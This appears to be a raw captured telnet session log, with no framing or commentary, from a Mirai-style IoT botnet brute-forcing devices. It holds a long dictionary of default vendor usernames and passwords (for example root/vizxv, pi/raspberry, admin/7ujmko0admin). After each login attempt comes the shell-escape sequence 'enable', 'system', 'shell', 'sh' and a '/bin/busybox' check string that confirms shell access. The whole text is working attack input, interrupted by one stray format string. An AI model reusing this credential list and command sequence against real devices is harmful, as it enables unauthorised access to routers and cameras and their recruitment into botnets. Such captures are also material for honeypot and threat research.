admin

administrator
enable
system
shell
sh
/bin/busybox 6gwskbro
wank

wank
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

1111111
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

9999
enable
system
shell
sh
/bin/busybox 6gwskbro
rewt

satori
enable
system
shell
sh
/bin/busybox 6gwskbro
cliuser

cliuser
enable
system
shell
sh
/bin/busybox 6gwskbro
root

alien
enable
system
shell
sh
/bin/busybox 6gwskbro
root

raspi
enable
system
shell
sh
/bin/busybox 6gwskbro
private
enable
system
shell
sh
/bin/busybox 6gwskbro
3ascotel
enable
system
shell
sh
/bin/busybox 6gwskbro
system

manager
enable
system
shell
sh
/bin/busybox 6gwskbro
demos
enable
system
shell
sh
/bin/busybox 6gwskbro
intraswitch

asante
enable
system
shell
sh
/bin/busybox 6gwskbro
root

klv1234
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

bintec
enable
system
shell
sh
/bin/busybox 6gwskbro
netscreen

<<< %s(un='%s') = %u
enable
system
shell
sh
/bin/busybox 6gwskbro
toor
enable
system
shell
sh
/bin/busybox 6gwskbro
root

cat1029
enable
system
shell
sh
/bin/busybox 6gwskbro
root

wh00t!
enable
system
shell
sh
/bin/busybox 6gwskbro
cmc

password
enable
system
shell
sh
/bin/busybox 6gwskbro
hax0r
enable
system
shell
sh
/bin/busybox 6gwskbro
mobile

alpine
enable
system
shell
sh
/bin/busybox 6gwskbro
backdoor
enable
system
shell
sh
/bin/busybox 6gwskbro
manager

manager
enable
system
shell
sh
/bin/busybox 6gwskbro
root

indigo
enable
system
shell
sh
/bin/busybox 6gwskbro
root

00000000
enable
system
shell
sh
/bin/busybox 6gwskbro
root

dasdec1
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

123456
enable
system
shell
sh
/bin/busybox 6gwskbro
security

security
enable
system
shell
sh
/bin/busybox 6gwskbro
tech

tech
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

pass
enable
system
shell
sh
/bin/busybox 6gwskbro
swift

swift
enable
system
shell
sh
/bin/busybox 6gwskbro
root

abc123
enable
system
shell
sh
/bin/busybox 6gwskbro
root

tandberg
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

atlantis
enable
system
shell
sh
/bin/busybox 6gwskbro
default
enable
system
shell
sh
/bin/busybox 6gwskbro
db2fenc1

db2fenc1
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

meinsm
enable
system
shell
sh
/bin/busybox 6gwskbro
superuser

passw0rd
enable
system
shell
sh
/bin/busybox 6gwskbro
root

h2014071
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

7ujmko0admin
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

qwestm0dem
enable
system
shell
sh
/bin/busybox 6gwskbro
db2as

ibmdb2
enable
system
shell
sh
/bin/busybox 6gwskbro
super

super
enable
system
shell
sh
/bin/busybox 6gwskbro
operator

profense
enable
system
shell
sh
/bin/busybox 6gwskbro
adminlvjh

adminlvjh123
enable
system
shell
sh
/bin/busybox 6gwskbro
ncorrect


enable
system
shell
sh
/bin/busybox 6gwskbro
root

1234567890
enable
system
shell
sh
/bin/busybox 6gwskbro
cisco
enable
system
shell
sh
/bin/busybox 6gwskbro
pi

raspberry
enable
system
shell
sh
/bin/busybox 6gwskbro
root

vmware
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

admin
enable
system
shell
sh
/bin/busybox 6gwskbro
service

service
enable
system
shell
sh
/bin/busybox 6gwskbro
gamez

lrkr0x
enable
system
shell
sh
/bin/busybox 6gwskbro
root

rootme
enable
system
shell
sh
/bin/busybox 6gwskbro
superuser

123456
enable
system
shell
sh
/bin/busybox 6gwskbro
citel
enable
system
shell
sh
/bin/busybox 6gwskbro
craft

crftpw
enable
system
shell
sh
/bin/busybox 6gwskbro
root

user
enable
system
shell
sh
/bin/busybox 6gwskbro
jill
enable
system
shell
sh
/bin/busybox 6gwskbro
root

rain
enable
system
shell
sh
/bin/busybox 6gwskbro
date
enable
system
shell
sh
/bin/busybox 6gwskbro
manager

friend
enable
system
shell
sh
/bin/busybox 6gwskbro
manager
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

password
enable
system
shell
sh
/bin/busybox 6gwskbro
cisco

cisco
enable
system
shell
sh
/bin/busybox 6gwskbro
root

123qwe
enable
system
shell
sh
/bin/busybox 6gwskbro
r00t
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

centuryl1nk
enable
system
shell
sh
/bin/busybox 6gwskbro
db2fenc1

ibmdb2
enable
system
shell
sh
/bin/busybox 6gwskbro
4dgifts
enable
system
shell
sh
/bin/busybox 6gwskbro
root

m
enable
system
shell
sh
/bin/busybox 6gwskbro
root

video
enable
system
shell
sh
/bin/busybox 6gwskbro
administrator

1234
enable
system
shell
sh
/bin/busybox 6gwskbro
admin
enable
system
shell
sh
/bin/busybox 6gwskbro
root

admin
enable
system
shell
sh
/bin/busybox 6gwskbro
root

zlxx.
enable
system
shell
sh
/bin/busybox 6gwskbro
nsroot

nsroot
enable
system
shell
sh
/bin/busybox 6gwskbro
root

admin
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

infoblox
enable
system
shell
sh
/bin/busybox 6gwskbro
root

qwe123
enable
system
shell
sh
/bin/busybox 6gwskbro
root

vizxv
enable
system
shell
sh
/bin/busybox 6gwskbro
superuser
enable
system
shell
sh
/bin/busybox 6gwskbro
informix

informix
enable
system
shell
sh
/bin/busybox 6gwskbro
alphanetworks

wrgg15_di524
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

4321
enable
system
shell
sh
/bin/busybox 6gwskbro
tech
enable
system
shell
sh
/bin/busybox 6gwskbro
iclock

timely
enable
system
shell
sh
/bin/busybox 6gwskbro
root

123
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

switch
enable
system
shell
sh
/bin/busybox 6gwskbro
mpi
enable
system
shell
sh
/bin/busybox 6gwskbro
apc

apc
enable
system
shell
sh
/bin/busybox 6gwskbro
root

changemenow
enable
system
shell
sh
/bin/busybox 6gwskbro
root

antslq
enable
system
shell
sh
/bin/busybox 6gwskbro
diag

danger
enable
system
shell
sh
/bin/busybox 6gwskbro
root

权限
enable
system
shell
sh
/bin/busybox 6gwskbro
root

nagiosxi
enable
system
shell
sh
/bin/busybox 6gwskbro
root

zte521
enable
system
shell
sh
/bin/busybox 6gwskbro
888888

888888
enable
system
shell
sh
/bin/busybox 6gwskbro
ascend
enable
system
shell
sh
/bin/busybox 6gwskbro
sync
enable
system
shell
sh
/bin/busybox 6gwskbro
support

support
enable
system
shell
sh
/bin/busybox 6gwskbro
root

tl789
enable
system
shell
sh
/bin/busybox 6gwskbro
admin
enable
system
shell
sh
/bin/busybox 6gwskbro
db2inst1

db2inst1
enable
system
shell
sh
/bin/busybox 6gwskbro
root

openvpnas
enable
system
shell
sh
/bin/busybox 6gwskbro
root

centreon
enable
system
shell
sh
/bin/busybox 6gwskbro
secret
enable
system
shell
sh
/bin/busybox 6gwskbro
666666

666666
enable
system
shell
sh
/bin/busybox 6gwskbro
root

ascend
enable
system
shell
sh
/bin/busybox 6gwskbro
qmik
enable
system
shell
sh
/bin/busybox 6gwskbro
root

123456
enable
system
shell
sh
/bin/busybox 6gwskbro
admin

diamond
enable
system
shell
sh
/bin/busybox 6gwskbro
operator
enable
system
shell
sh
/bin/busybox 6gwskbro
root

54321
enable
system
shell
sh
/bin/busybox 6gwskbro
stoogr
enable
system
shell
sh
/bin/busybox 6gwskbro
netics
enable
system
shell
sh
/bin/busybox 6gwskbro
root
enable
system
shell
sh
/bin/busybox 6gwskbro
root

888888
enable
system
shell
sh
/bin/busybox 6gwskbro
sysadm

anicust
enable
system
shell
sh
/bin/busybox 6gwskbro
root

ikwb
enable
system
shell
sh
/bin/busybox 6gwskbro
